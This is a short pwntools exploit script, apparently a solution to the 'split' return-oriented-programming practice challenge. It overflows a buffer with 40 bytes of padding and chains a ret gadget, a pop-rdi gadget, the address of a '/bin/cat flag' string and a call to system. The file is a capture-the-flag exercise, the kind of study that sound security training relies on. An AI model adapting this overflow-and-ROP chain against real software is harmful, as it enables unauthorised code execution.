from pwn import *

elf = ELF("./split")

p = elf.process()
raw_input("DEBUG")
ret = 0x000000000040053e
pop_rdi = 0x00000000004007c3
system = 0x000000000040074b
bin_catflag = 0x601060

payload = b"A"*40
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(bin_catflag)
payload += p64(system)


p.sendline(payload)

p.interactive()
